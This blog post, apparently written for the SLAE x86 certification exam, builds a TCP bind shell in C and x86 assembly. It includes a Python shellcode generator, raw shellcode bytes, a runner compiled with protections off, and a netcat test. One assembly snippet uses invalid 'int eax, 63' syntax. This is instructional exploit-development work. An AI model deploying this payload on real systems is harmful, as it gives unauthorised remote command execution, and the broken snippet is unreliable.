---
title: "SLAE x86 Exam - Assignment #1"
date: 2021-11-28
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 1st assignment requires you to write a `Bind Shell TCP`, which is simply a listening socket that executes commands received from the client and sends back the `standard output` and `standard error`.

The port number should be easily configurable.

## Source code

The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/code/assignment_1/).

List of files:

- [first_attempt/shell_bind_tcp.c](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.c): first attempt at writing a Bind Shell in `C`
- [first_attempt/shell_bind_tcp.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.nasm): first attempt at writing a Bind Shell in `Assembly`
- [final_attempt/shell_bind_tcp.c](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/shell_bind_tcp.c): final attempt at writing a Bind Shell in `C`
- [final_attempt/shell_bind_tcp.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/shell_bind_tcp.nasm): final attempt at writing a Bind Shell in `Assembly`
- [final_attempt/automation/wrapper.py](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/automation/wrapper.py): `python` script to automate the generation of shellcode based on arbitrary TCP ports
- [final_attempt/automation/template.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/automation/template.nasm): generic template used by `wrapper.py`

## First Attempt

Follows the visual representation of the first implementation:

![First Implementation of Bind Shell TCP](/assets/img/slae32/bind_shellcode_tcp_1.jpg)
*My first implementation of a TCP Bind Shell*

### C Code

Based on the graph previously shown, the first step is to create TCP socket that listens on a specific combination of IP address and TCP port. For now I chose to use `0.0.0.0:4444`; in the chapter **Automation** I explain how to use a `python` script to specify arbitary values (for the TCP port).

```cpp
int server_socket_fd;
struct sockaddr_in server_address;

// create a TCP socket
server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
```

{% sidenote The `socket()` function creates a socket, which is represented by a `File Descriptor` (abbreviated as `fd`) on Linux systems  %}

```cpp
server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = INADDR_ANY;
server_address.sin_port = htons(4444);

// bind the socket to 0.0.0.0:4444
bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));

// set it as a passive socket that listens for connections
listen(server_socket_fd, 1);
```

Let's look at the code above: initially, a socket is created through the `socket` function, which returns a `File Descriptor`. The arguments `SOCK_STREAM` and `IPPROTO_TCP` allow for the creation of a `TCP` socket.

After that, you have to to specify the address and port number on which to bind the socket. In this case, I used `INADDR_ANY` (i.e. `0.0.0.0`) and the typical TCP port used by *Metasploit* (`4444`).

These variables are passed to the `bind` function, which performs the binding operation. However, if you were to run `ss -tnl` (or `netstat -plnt`), you wouldn't find the current socket yet.

The reason is that we have to execute the `listen` function first. Let's look at its [prototype](https://man7.org/linux/man-pages/man2/listen.2.html):

```cpp
#include <sys/socket.h>

int listen(int sockfd, int backlog);
```

It accepts 2 arguments:

1. the file descriptor of a TCP socket
2. *the maximum length to which the queue of pending connections for sockfd may grow* (ref: [man page](https://man7.org/linux/man-pages/man2/listen.2.html))

Before being able to receive data and execute commands, the socket has to accept a connection from incoming clients:

```cpp
int client_socket_fd, bytes_read, size_client_socket_struct;
struct sockaddr_in client_address;

// accept incoming connections
size_client_socket_struct = sizeof(struct sockaddr_in);
client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);
```

{% sidenote Accept a client connection and place its socket inside the variable `client_address` %}

```cpp
// redirect standard input/output/error to the socket
dup2(client_socket_fd, 0);
dup2(client_socket_fd, 1);
dup2(client_socket_fd, 2);
```

I used `dup2` in order to redirect `stdin`, `stdout`, and `stderr` of the current shell towards the client socket, so it acts as an interactive shell.

What's missing now is the code that executes the commands sent by the client:

```cpp
char client_command[1024] = {0};

char *const parmList[] = {"/bin/sh", "-c", client_command, NULL};
char *const envParms[] = {NULL};

// receive data from client (max 1024 bytes)
while ((bytes_read = recv(client_socket_fd, &client_command, 1024, 0)) > 0) {
    // execute client command
    system(client_command);
    memset(client_command, 0, sizeof(client_command));
}
```

The loop right above checks if the client has sent any data. If so, it executes the command and sends `input`/`output`/`error` to the client socket.

Finally, it uses the function `memset` to clear the buffer that stores the command, in order to avoid previous commands from corrupting next ones.

The full C program can be found inside the [repo created for this exam](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.c).

### Assembly

#### Socket creation

The first function we need to convert into Assembly is `socket`. Unfortunately, there isn't a specific syscall that creates a socket, although there is one named `socketcall`. Follows an excerpt taken from its [man page](https://linux.die.net/man/2/socketcall):

> `int socketcall(int call, unsigned long *args);`
>
> **socketcall()** is a common kernel entry point for the socket system calls. *call* determines which socket function to invoke. *args* points to a block containing the actual arguments, which are passed through to the appropriate call.

Based on this description and the function prototype, it seems we first need to find the right `call` value that references `socket()`. Although man pages don't list all the possible values for this argument (please contact me if you find them inside the man pages), we can take a look at the source code of the Linux kernel.

To be more specific, [this page](https://github.com/torvalds/linux/blob/master/net/socket.c#L2901) contains the implementation of the `socketcall` function, listing several possible value for the argument `call`:

```cpp
// ...

switch (call) {

  case SYS_SOCKET:
    err = __sys_socket(a0, a1, a[2]);
    break;

  case SYS_BIND:
    err = __sys_bind(a0, (struct sockaddr __user *)a1, a[2]);
    break;

  case SYS_CONNECT:
    err = __sys_connect(a0, (struct sockaddr __user *)a1, a[2]);
    break;

  case SYS_LISTEN:
    err = __sys_listen(a0, a1);
    break;

  case SYS_ACCEPT:
    err = __sys_accept4(a0, (struct sockaddr __user *)a1, (int __user *)a[2], 0);
    break;

  case SYS_GETSOCKNAME:
    err = __sys_getsockname(a0, (struct sockaddr __user *)a1, (int __user *)a[2]);
    break;

// ...
```

Nevertheless, it isn't quite what we want: it doesn't show the integer values for these values. Digging a bit deeper, I found them inside the file [include/uapi/linux/net.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27) of the Linux kernel.

```cpp
#define SYS_SOCKET            1      /*     sys_socket(2)          */
#define SYS_BIND              2      /*     sys_bind(2)            */
#define SYS_CONNECT           3      /*     sys_connect(2)         */
#define SYS_LISTEN            4      /*     sys_listen(2)          */
#define SYS_ACCEPT            5      /*     sys_accept(2)          */
#define SYS_GETSOCKNAME       6      /*     sys_getsockname(2)     */
#define SYS_GETPEERNAME       7      /*     sys_getpeername(2)     */
#define SYS_SOCKETPAIR        8      /*     sys_socketpair(2)      */
#define SYS_SEND              9      /*     sys_send(2)            */
#define SYS_RECV              10     /*     sys_recv(2)            */
#define SYS_SENDTO            11     /*     sys_sendto(2)          */
#define SYS_RECVFROM          12     /*     sys_recvfrom(2)        */
#define SYS_SHUTDOWN          13     /*     sys_shutdown(2)        */
#define SYS_SETSOCKOPT        14     /*     sys_setsockopt(2)      */
#define SYS_GETSOCKOPT        15     /*     sys_getsockopt(2)      */
#define SYS_SENDMSG           16     /*     sys_sendmsg(2)         */
#define SYS_RECVMSG           17     /*     sys_recvmsg(2)         */
#define SYS_ACCEPT4           18     /*     sys_accept4(2)         */
#define SYS_RECVMMSG          19     /*     sys_recvmmsg(2)        */
#define SYS_SENDMMSG          20     /*     sys_sendmmsg(2)        */
```

Now we should be able to use the `socket` function to create a TCP socket.

```nasm
; Author: Robert Catalin Raducioiu (rbct)

global _start

section .text

_start:

    ; SYSCALLS for Linux x86:
    ; /usr/include/i386-linux-gnu/asm/unistd_32.h
    ; or https://web.archive.org/web/20160214193152/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html

    ; sys_socketcall
    xor eax, eax
    mov ebx, eax
    mov ecx, eax
    mov al, 102

    ; SYS_SOCKET
    mov bl, 1

    ; IPPROTO_TCP
    mov cl, 6
    push ecx

    ; SOCK_STREAM (0x00000001)
    push ebx

    ; AF_INET
    mov cl, 2
    push ecx

    ; Pointer to the arguments for SYS_SOCKET call
    mov ecx, esp

    ; call syscall
    int 0x80
```

Debugging the program with `gdb` and stopping after the syscall I noticed the following output:

```bash
lsof -p PID

# COMMAND    PID USER   FD   TYPE     DEVICE SIZE/OFF  NODE NAME
# tcp_bind_ 4339 rbct  cwd    DIR        8,1     4096  6052 /home/rbct/exam/assignment_1
# tcp_bind_ 4339 rbct  rtd    DIR        8,1     4096     2 /
# tcp_bind_ 4339 rbct  txt    REG        8,1      522  6053 /home/rbct/exam/assignment_1/tcp_bind_shell
# tcp_bind_ 4339 rbct    0u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    1u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    2u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    3u  unix 0x00000000      0t0 89245 socket
# tcp_bind_ 4339 rbct    4u  unix 0x00000000      0t0 89246 socket
# tcp_bind_ 4339 rbct    5r  FIFO        0,8      0t0 89247 pipe
# tcp_bind_ 4339 rbct    6w  FIFO        0,8      0t0 89247 pipe
# tcp_bind_ 4339 rbct    7u  sock        0,7      0t0 89254 can't identify protocol
```

It successfully created a socket (identified by the file descriptor `7`, `u` specifies `read` and `write` permissions according to the man page of `lsof`).

#### Socket binding

Next is the turn of the `bind` function.

```cpp
server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = INADDR_ANY;
server_address.sin_port = htons(4444);

// bind the socket to 0.0.0.0:4444
bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));
```

First, I need to understand how to create a `sockaddr_in` struct (variable `server_address`).

Based on [the Linux manual](https://man7.org/linux/man-pages/man7/ip.7.html), the definition of the struct looks like this:

```cpp
struct sockaddr_in {
  sa_family_t    sin_family; /* address family: AF_INET */
  in_port_t      sin_port;   /* port in network byte order */
  struct in_addr sin_addr;   /* internet address */
};

/* Internet address */
struct in_addr {
  uint32_t       s_addr;     /* address in network byte order */
}
```

Now we need the type definition of `sa_family_t`, which I found defined inside the file [/usr/include/socket.h](https://elixir.bootlin.com/linux/latest/source/include/linux/socket.h#L26):

```cpp
typedef __kernel_sa_family_t    sa_family_t;
```

According to the file [include/uapi/linux/socket.h](https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/socket.h#L10), it's an `unsigned short` integer:

```cpp
typedef unsigned short __kernel_sa_family_t;
```

On x86 systems an unsigned short integer occupies `2 bytes` of data. Now there's only `in_port_t` left. The latter is defined inside the file [netinetin.h](https://man7.org/linux/man-pages/man0/netinet_in.h.0p.html):

> The `<netinet/in.h>` header shall define the following types:
>
> - `in_port_t` Equivalent to the type uint16_t as described in `<inttypes.h>`

It seems to be an `unsigned short` integer, just like `sa_family_t`.

Based on all of this information, now the struct should look like this:

```cpp
struct sockaddr_in {
  unsigned short      sin_family;
  unsigned short      sin_port;
  struct in_addr      sin_addr;
};

struct in_addr sin_addr {
  unsigned int        s_addr;
}
```

One of the mistakes I made is to sum the bytes of the variables in order to calculate the size of the struct (`short` + `short` + `int` = `8` bytes). Long story short: many `struct` objects use `padding` for compatibility with different systems.

Moreover, don't forget the definition of `sys_socketcall`:

```cpp
int syscall(SYS_socketcall, int call, unsigned long *args);
```

In particular, in the case of the `bind` function, you can't use `ECX`, `EDX`, and so on, because they would be passed to `sys_socketcall`. Just like before (see chapter *Socket creation*), the arguments are passed as a pointer, using the `ECX` register.

Follows the assembly code:

```nasm
    ; INADDR_ANY (0x00000000)
    dec ebx
    push ebx
    
    ; 0x0002 -> AF_INET
    ; 0x115c -> htons(4444)

    push WORD 0x5c11

    mov bl, 2
    push WORD bx
    ; push 0x5c110002

    ; save the pointer to the struct for later
    mov ecx, esp
    
    ; 3rd argument of bind(): size of the struct
    ; push 16
    rol bl, 3
    push ebx

    ; 2nd argument of bind(): pointer to the struct
    push ecx

    ; 1st argument of bind(): file descriptor of the server socket
    mov esi, eax
    push eax
    
    ; syscall socketcall
    xor eax, eax
    mov al, 102

    ; 1st argument of socketcall(): call SYS_BIND
    ror bl, 3

    ; 2nd argument of socketcall(): pointer to the parameters of bind()
    mov ecx, esp

    int 0x80
```

You may be wondering why I used `PUSH 16` for the 3rd argument of `bind()`, instead of the current size of struct, which is 8 bytes. As I said before: it's all about `padding`. Initially, if I used `PUSH 8`, the call to `bind()` would return the value `0xffffffea` (`EINVAL`), which means one of the arguments is invalid.

Later, I discovered the right size of the struct is `16` bytes (doing a simple `printf` of `sizeof(server_address)`). However, the real reason can be inferred from the definition of the struct:

```cpp
#define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */

struct sockaddr_in {
  __kernel_sa_family_t  sin_family;     /* Address family               */
  __be16                sin_port;       /* Port number                  */
  struct in_addr        sin_addr;       /* Internet address             */

  /* Pad to size of `struct sockaddr'. */
  unsigned char         __pad[__SOCK_SIZE__ - sizeof(short int) -
                        sizeof(unsigned short int) - sizeof(struct in_addr)];
};
```

As you can see, it uses padding bytes in order to reach a size of `16` bytes.

#### Listening for connections

Next, we need to convert the following line into assembly:

```cpp
// set it as a passive socket that listens for connections
listen(server_socket_fd, 1);
```

Based on previous findings, the second argument of `socketcall` should be `SYS_LISTEN` (`4`).

Follows the assembly code:

```nasm
    ; 2nd argument of listen(): set backlog (connection queue size) to 1
    mov bl, 1

    push 1
```

{% sidenote I thought `push 1` is interpreted as `push` `0x00000001`, but [it seems](http://sparksandflames.com/files/x86InstructionChart.html) the opcode `6A` can be used to push a single byte as a 32-bit value  %}

```nasm
    ; 1st argument of listen(): file descriptor of the server socket
    push esi
    
    ; syscall socketcall
    mov eax, ebx
    mov al, 102

    ; 1st argument of socketcall(): SYS_LISTEN call
    ; mov ebx, 4
    rol bl, 2

    ; 2nd argument of socketcall(): pointer to listen() arguments
    mov ecx, esp

    ; execute listen()
    int 0x80
```

#### Accepting connections

It's time to accept incoming connections from clients (max 1 client in this case). We need to convert the following C code into assembly:

```cpp
size_client_socket_struct = sizeof(struct sockaddr_in);
client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);
```

Follows the assembly code:

```nasm
    ; 3rd argument of accept(): size of client_address struct
    rol bl, 2
    push ebx

    ; 2nd argument of accept: client_address struct, in this case empty
    xor ebx, ebx
    push ebx
    push ebx

    ; 1st argument of accept: file descriptor of the server socket
    push esi

    ; syscall socketcall
    ; mov eax, 102
    mov eax, ebx
    mov al, 102

    ; 1st argument of socketcall(): SYS_ACCEPT call
    mov bl, 5

    ; 2nd argument of socketcall(): pointer to accept() arguments
    mov ecx, esp

    ; execute accept()
    int 0x80
```

#### I/O Redirection

As mentioned previously, the redirection of `input`/`output`/`error` is performed by means of the function `dup2`. The call to `accept()` returns the File Descriptor associated with the Client Socket.

```cpp
dup2(client_socket_fd, 0);
dup2(client_socket_fd, 1);
dup2(client_socket_fd, 2);
```

According to the file `/usr/include/i386-linux-gnu/asm/unistd_32.h`, `dup2` is the syscall `#63`. Given this information, we're now ready to convert the code above into assembly:

```nasm
    ; save the Client File Descriptor for later use
    mov edi, eax

    ; dup2(client_socket_fd, 0)
    int eax, 63
    int ebx, edi
    int ecx, 0
    int 0x80

    ; dup2(client_socket_fd, 1)
    int eax, 63
    int ebx, edi
    int ecx, 1
    int 0x80

    ; dup2(client_socket_fd, 2)
    int eax, 63
    int ebx, edi
    int ecx, 02
    int 0x80
```

This is good enough, but I wanted a better approach, one that uses fewer bytes and it's also free of `NULL` ones:

```nasm
    ; loop counter (repeats dup2() three times)
    mov ecx, ebx
    mov bl, 3

    ; save Client File Descriptor for later use
    mov edi, eax

RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov al, 63

    ; Client file descriptor
    mov ebx, edi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate
```

In the code above, the `loop` instruction is used to repeat the routine `RepeatDuplicate` three times, for `error` (fd: 2), `output` (fd: 1), and `input` (fd: 0).

#### Command Execution

Finally, to have a fully-functional bind shell, we need to convert the following block of code into assembly:

```cpp
// receive data from client (max 1024 bytes)
while ((bytes_read = recv(client_socket_fd, &client_command, 1024, 0)) > 0) {
    // execute client command
    system(client_command);
    memset(client_command, 0, sizeof(client_command));
}
```

Follows the syscall numbers:

- `recv`: invoked via `socketcall` (`SYS_RECV`: `10`)
- `system`: it's a wrapper, so we're going to use `execve`
- `memset`: there's no syscall

It seems we're missing some functions. Therefore, I decided to reimplement it manually:

```nasm
ReceiveData:

    xor ecx, ecx
    mov ebx, ecx
    mov ch, 4
    lea eax, [ReceivedData]

ClearCommandBuffer:

    mov [eax], BYTE bl
    inc eax 
    dec ecx 
    loop ClearCommandBuffer
```

{% sidenote Implementation of `memset`, loop 1024 times in order to clear the buffer %}

```nasm
    ; 4th argument of recv(): NO flags
    push ebx

    ; 3rd argument of recv(): size of the buffer that stores the command received
    xor ebx, ebx
    inc ebx
    rol bx, 10
    push ebx

    ; 2nd argument of recv(): pointer to the aforementione buffer
    push ReceivedData

    ; Client File Descriptor
    push edi

    ; syscall #102: socketcall()
    xor eax, eax
    mov al, 102

    ; 1st argument of socketcall(): call SYS_RECV
    xor ebx, ebx
    mov bl, 10

    ; 2nd argument of socketcall(): pointer to the arguments of SYS_RECV
    mov ecx, esp

    ; invoke socketcall()
    int 0x80
```

{% sidenote Use `socketcall` to call `recv` and receive the command to be executed %}

```nasm
    cmp al, 0xff
    je Exit

    xor eax, eax
    mov al, 2
    int 0x80

    ; if the return value of fork() == 0, it means we're in the child process
    xor ebx, ebx
    cmp eax, ebx
    jne ReceiveData
```

{% sidenote After the `fork`, the *parent* process waits for data to be received, while the *child* process executes the command received just now %}

```nasm
ExecuteCommand:

    xor esi, esi
    push esi

    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
```

{% sidenote String `//bin/sh` %}

```nasm
    mov eax, esi
    mov ax, 0x632d
    push eax

    mov eax, esp
```

{% sidenote String `-c` %}


```nasm
    push esi
    push ReceivedData
    push eax
    push ebx

    mov eax, esi
    mov al, 11
    mov ecx, esp

    push esi
    mov edx, esp

    int 0x80
```

{% sidenote After executing the command (syscall 11: `execve`), the child process exits gracefully %}

```nasm
Exit:

    mov eax, esi
    inc eax
    int 0x80

section .bss

    ReceivedData:   resb 1024
```

To summarise: after redirecting input, output, and error, the program waits to receive data from the Client Socket, using the routine `ReceiveData`, which also clear the buffer to prevent corruption.

After receiving the command, the `fork` syscall is employed. The reason is due to how `execve` works: once it executes the command, it process exits, so it wouldn't return to receiving other data. In this case, forking allows us to keep a `parent process` that receives commands, and spawn a `child process` for each command executed.

## Final attempt

Follows the visual representation of the final implementation:

![Final Implementation of Bind Shell TCP](/assets/img/slae32/bind_shellcode_tcp_2.jpg)
*My final implementation of a TCP Bind Shell*

### C Code

After finishing the second assignment, I noticed the shellcode I wrote uses too many instructions. To be more specific, the final block (`recv-memset-system`) is superfluous. In fact, once you redirect `stdin`, `stdout` and `stderr`, you can simply spawn a shell and the job is done:

```cpp
#include <netinet/ip.h>

int main() {
    int server_socket_fd, client_socket_fd, size_client_socket_struct;
    struct sockaddr_in server_address, client_address;

    // create a TCP socket
    server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(4444);

    // bind the socket to 0.0.0.0:4444
    bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));

    // passive socket that listens for connections
    listen(server_socket_fd, 1);

    // accept incoming connection
    size_client_socket_struct = sizeof(struct sockaddr_in);
    client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);

    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    system("/bin/bash");
}
```

### Assembly

Here's the assembly code that starts from the `RepeatDuplicate` label:

```nasm
RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov eax, 63

    ; Client file descriptor
    mov ebx, edi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate

SpawnShell:

    push ecx

    ; argv, 2nd argument of execve
    mov ecx, esp

    ; envp, 3rd argument of execve
    mov edx, esp
```

{% sidenote `ECX` and `EDX` are pointers to `NULL`, so **argv** and **envp** are empty %}

```nasm
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    ; exceve syscall
    xor eax, eax
    mov al, 11
    int 0x80
```

{% sidenote Call `execve` on `//bin/sh` %}

As you can see, after it redirects input, output, and error, the `execve` syscall spawns an SH shell.

## Automation

One of the requirements of the assignment is to be able to easily configure the TCP port. I decided to write `python` script that acts as a wrapper (script named `wrapper.py`):

```py
import os
import sys
import argparse
import traceback
import subprocess


def print_shellcode(object_file_path):

    try:
        command = ["objcopy", "-O", "binary", "-j", ".text", object_file_path, "/dev/stdout"]
        proc = subprocess.run(command, stdout=subprocess.PIPE)
    except:
        print(traceback.format_exc())
        sys.exit(1)
```

{% sidenote The binary `objcopy` belongs to the package `binutils`, which must be installed, otherwise the program will throw an error %}

```py
    shellcode = proc.stdout
    shellcode_string = ""

    for b in shellcode:
        shellcode_string += f"\\x{b:02x}"

    if 0x00 in shellcode:
        print(f"[!] Found NULL byte in shellcode")

    print(f"[+] Shellcode length: {len(shellcode)} bytes")
    print(f"[+] Shellcode:")
    print(f'"{shellcode_string}";')
```

{% sidenote I wrote the function `print_shellcode` in order to extract the executable code from the `.text` section of the object file. It allows you to easily paste the shellcode into the shellcode runner %}

```py
def generate_shellcode(output_file_path):

    object_file_path = output_file_path.replace(".nasm", ".o", 1)
    executable_path = output_file_path.replace(".nasm", "", 1)

    try:
        os.system(f"nasm -f elf32 -o {object_file_path} {output_file_path}")
        os.system(f"ld -m elf_i386 -o {executable_path} {object_file_path}")
```

{% sidenote The program also requires `nasm` and `ld`, the latter should be present by default on Linux systems %}

```py
        print(f"[+] Object file generated at {output_file_path}")
        print(f"[+] Executable binary generated at {executable_path}")

        print_shellcode(object_file_path)
    except:
        print(traceback.format_exc())
        sys.exit(1)

def replace_template_values(template_name, tcp_port, output_file_path):

    with open(template_name) as f:
        template_code = f.read()

    tcp_port_hex = (tcp_port).to_bytes(2, "little").hex()

    if '00' in tcp_port_hex:
        if '00' in tcp_port_hex[:2]:
            non_null_byte = tcp_port_hex[2:]
            replace_code = f"mov bl, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
        else:
            non_null_byte = tcp_port_hex[:2]
            replace_code = f"mov bh, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
    else:
        replace_code = f"push WORD 0x{tcp_port_hex}"
```

{% sidenote These last instructions allows you avoid `NULL` bytes in the TCP port number. For example, the port `256` is converted to `0x0001` (big endian), while port `80` is converted to `0x5000` %}

```py
    template_code = template_code.replace("{{ TEMPLATE_TCP_PORT }}", replace_code, 1)
    
    with open(output_file_path, 'w') as f:
        f.write(template_code)

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, help='TCP Port for the Bind Shell', required=True, metavar="[1-65535]")
    parser.add_argument('-t', '--template', help='Path of the NASM template file. Example: -t /tmp/template.nasm', required=True)
    parser.add_argument('-o', '--output', help='Path for the output file. Example: -o /tmp/output.nasm', required=True)

    args = parser.parse_args()

    tcp_port = args.port
    if tcp_port not in range(1, 65536):
        print(f"[!] Argument '--port' must be in range [1-65535]")
        sys.exit(1)

    shellcode_template = args.template
    output_file_path = args.output

    replace_template_values(shellcode_template, tcp_port, output_file_path)
    generate_shellcode(output_file_path)


if __name__ == '__main__':

    main()

```

Thanks to `argparse`, when you run the script, it asks you for the required arguments:

```bash
python3 script.py -h

# usage: script.py [-h] -p [1-65535] -t TEMPLATE -o OUTPUT

# optional arguments:
#   -h, --help            show this help message and exit
#   -p [1-65535], --port [1-65535]
#                         TCP Port for the Bind Shell
#   -t TEMPLATE, --template TEMPLATE
#                         Path of the NASM template file. Example: -t /tmp/template.nasm
#   -o OUTPUT, --output OUTPUT
#                         Path for the output file. Example: -o /tmp/output.nasm
```

If you pass the required arguments, it finally prints the shellcode which you can copy into a shellcode runner. Follows an example:

```bash
python3 script.py -p 80 -t ./template.nasm -o /tmp/output.nasm

# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 133 bytes
# [+] Shellcode:
# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\xb7\x50\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80";
```

As I mentioned previously in the sidenotes, the script requires the following binaries:

- `objcopy` (from the package `binutils`)
- `nasm` (from the homonymous package)
- `ld` (The GNU linker)

The python script and the `NASM` template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder [/code/assignment_1/final_attempt/automation](https://github.com/rbctee/SlaeExam/tree/main/code/assignment_1/final_attempt/automation).

## Testing

As regards the testing phase, I decided to use the python script to generate shellcode for a Bind Shell listening on the TCP port `1234`:

```bash
python3 script.py -p 1234 -t ./template.nasm -o /tmp/output.nasm

# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 130 bytes
# [+] Shellcode:
# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";
```

To test the shellcode generated by the python script, I used the following C `shellcode runner`:

```cpp
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";

main() {
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
```

Compile and run it:

```bash
gcc -fno-stack-protector -z execstack -o tcp_bind_shell shellcode_runner.c
./tcp_bind_shell
```

Finally, I confirmed I could connect with `netcat` and execute commands:

```bash
rbct@slae:~$ nc 127.0.0.1 1234
whoami
rbct
id
uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
exit
rbct@slae:~$
```
